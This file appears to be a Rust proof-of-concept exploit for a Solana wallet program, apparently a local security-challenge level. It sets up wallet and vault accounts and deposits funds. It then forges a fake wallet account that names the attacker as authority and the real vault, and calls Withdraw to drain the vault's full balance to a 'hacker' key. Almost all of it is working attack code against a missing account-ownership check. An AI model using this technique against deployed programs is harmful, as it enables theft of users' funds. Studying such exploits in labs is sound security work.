use std::{thread, time::Duration};
use kdam::prelude::*;
use owo_colors::OwoColorize;
use poc_framework::solana_program::pubkey::Pubkey;
use poc_framework::{keypair, RemoteEnvironment,};
use poc_framework::solana_sdk::system_program;
use poc_framework::solana_program::instruction::{AccountMeta, Instruction};
use poc_framework::solana_sdk::{
    signature::{read_keypair_file, Signer},
};

use poc_framework::Environment;
use poc_framework::localhost_client;

use borsh::{BorshSerialize, BorshDeserialize};

// We use the same Structure created in the Smart Contract
#[derive(Debug, BorshDeserialize, BorshSerialize)]

pub enum WalletInstruction {
    Initialize,
    Deposit { amount: u64 },
    Withdraw { amount: u64 },
}

#[repr(C)]
#[derive(Clone, Copy, Debug, Default, PartialEq, BorshSerialize, BorshDeserialize)]
pub struct Wallet {
    pub authority: Pubkey,
    pub vault: Pubkey,
}

pub const WALLET_LEN: u64 = 32 + 32;

pub fn main() {
    let programa_keypair = read_keypair_file("./target/so/level0-keypair.json").unwrap();
    let programa = programa_keypair.pubkey();
    let cliente1 = localhost_client();
    
    let wallet_info = keypair(1);
    let vault_info = keypair(2);
    let hacker = keypair(4);
    let authority_info = keypair(3);

    let (wallet_address, _wallet_seed) =
    Pubkey::find_program_address(&[&authority_info.pubkey().to_bytes()], &programa);
    let (vault_address, _vault_seed) = Pubkey::find_program_address(
    &[&authority_info.pubkey().to_bytes(), &"VAULT".as_bytes()], &programa);

    /* First we create the accounts */
 
    let mut env = RemoteEnvironment::new_with_airdrop(cliente1, keypair(3), 10000000000);
            env.airdrop(wallet_info.pubkey(), 100000000);
            env.airdrop(vault_info.pubkey(), 100000000);
            env.execute_as_transaction(
                &[Instruction {
                    program_id: programa,
                    accounts: vec![
                        AccountMeta::new(wallet_address, false),
                        AccountMeta::new(vault_address, false),
                        AccountMeta::new(authority_info.pubkey(), true),
                        AccountMeta::new_readonly(poc_framework::solana_program::sysvar::rent::id(), false),
                        AccountMeta::new_readonly(system_program::id(), false),
                        ],
                        data: WalletInstruction::Initialize.try_to_vec().unwrap(), 
                        }],
                        &[&authority_info],
                    );
            let wallet_address_info = env.get_account(wallet_address).unwrap();
            let vault_address_info = env.get_account(vault_address).unwrap();

            let wallet_address_deser = env.get_deserialized_account::<Wallet>(wallet_address).unwrap();
            println!("");
            println!("{}", "INITIALIZE & CREATE ACCOUNTS".bold().yellow());
            println!("");
            println!("{} {:?}", "Wallet info address: ".bold().blue(), wallet_info.pubkey().blue());
            println!("{} {:?}", "Vault info address: ".bold().blue(), vault_info.pubkey().blue());
            println!("");
            println!("{}", "PDA Addresses created!".bold().red());
            println!("");
            println!("{} {} {} {:?}", "Wallet address: ".bold().yellow(), wallet_address.yellow(), 
            "  Wallet address info: ".bold().blue(), wallet_address_info.blue());
            println!("");
            println!("{} {} {} {:?}", "Vault address: ".bold().yellow(), vault_address.yellow(), 
            "  Vault address info: ".bold().blue(), vault_address_info.blue());
            println!("");
            println!("{} {:?}", 
            "Wallet address data deser with Wallet Struct: ".bold().green(), wallet_address_deser.green());

            //writeln!(stdout, "Press any key to continue ASAP :)").unwrap();
            //stdout.flush().unwrap();
            // Read a single byte and discard
            //let _ = stdin.read(&mut [0u8]).unwrap();
            println!("");
            println!("{}", "***** IMPORTANT *****".bright_blue().blink().bold());
            println!("");
            println!("{}", "Check the results a little bit....".bold().yellow());      
            println!("");
            println!("");

            for _ in tqdm!(0..100) { thread::sleep(Duration::from_millis(70)); }
            println!("");   
            println!("");   
            env.execute_as_transaction(
                &[Instruction {
                    program_id: programa,
                    accounts: vec![
                        AccountMeta::new(wallet_address, false), //<- deser vault data must be = vault_addr
                        AccountMeta::new(vault_address, false), //<- must be = wallet_address.vault <--|
                        AccountMeta::new(authority_info.pubkey(), true), //<- source - dest -----------|
                        AccountMeta::new_readonly(system_program::id(), false),
                        ],
                        data: WalletInstruction::Deposit { amount: 10000 }.try_to_vec().unwrap(),
                    }],
                        &[&authority_info],
                    );
            let wallet_address_info = env.get_account(wallet_address).unwrap();
            let vault_address_info = env.get_account(vault_address).unwrap();

            let wallet_address_deser = env.get_deserialized_account::<Wallet>(wallet_address).unwrap();

            println!("{} {:?}", "Wallet info address: ".bold().blue(), wallet_info.pubkey().blue());
            println!("{} {:?}", "Vault info address: ".bold().blue(), vault_info.pubkey().blue());
            println!("");
            println!("{}", "TRANSFER".yellow().bold());
            println!("");
            println!("{} {} {} {}", "From: ".bold().red(), authority_info.pubkey().red(),
            " ---- > AMOUNT: 10000 ---- TO -->".bold().green(), vault_address.blue());
            println!("");
            println!("{} {} {} {:?}", "Wallet address: ".bold().yellow(), wallet_address.yellow(), 
            "  Wallet address info: ".bold().blue(), wallet_address_info.blue());
            println!("");
            println!("{} {} {} {:?}", "Vault address: ".bold().yellow(), vault_address.yellow(), 
            "  Vault address info: ".bold().blue(), vault_address_info.blue());
            println!("");
            println!("{} {:?}", 
            "Wallet address data deser with Wallet Struct: ".bold().green(), wallet_address_deser.green());

               /* Third we steal the money */
            println!("");
            println!("{}", "***** IMPORTANT *****".bright_blue().blink().bold());
            println!("");
            println!("{}", "Check the results a little bit....".bold().yellow());      
            println!("");
            println!("");

            for _ in tqdm!(0..100) { thread::sleep(Duration::from_millis(70)); }
            println!("");   
            println!("");   
            println!("{}", "WITHDRAW FUNDS TO HACKER".bold().yellow());

            let hacker_wallet = Wallet {
                authority: hacker.pubkey(),
                vault: vault_address,
            };

            let mut hacker_wallet_data: Vec<u8> = vec![];
            hacker_wallet.serialize(&mut hacker_wallet_data).unwrap();

            let fake_wallet = keypair(4);
            env.create_account_with_data(&fake_wallet, hacker_wallet_data);

            let steal_amount = env.get_account(vault_address).unwrap().lamports;

            env.airdrop(hacker.pubkey(), 1000000);

            env.execute_as_transaction(
                &[Instruction {
                    program_id: programa,
                    accounts: vec![
                        AccountMeta::new(fake_wallet.pubkey(), false),
                        AccountMeta::new(vault_address, false), //<- source
                        AccountMeta::new(hacker.pubkey(), true),
                        AccountMeta::new(hacker.pubkey(), false), //<- destination
                        AccountMeta::new_readonly(system_program::id(), false),
                        ],
                        data: WalletInstruction::Withdraw { amount: steal_amount }.try_to_vec().unwrap(),
                    }],
                        &[&hacker],
                    );
            let hacker_address_info = env.get_account(hacker.pubkey()).unwrap();
            let vault_address_info = env.get_account(vault_address);

            println!("{} {:?}", "Hacker info address: ".bold().blue(), hacker_address_info.blue());
            println!("");
            println!("{} {:?}", "Vault info address does not exist anymore: ".bold().red(), vault_address_info.blue().bright_purple().bold().underline());




}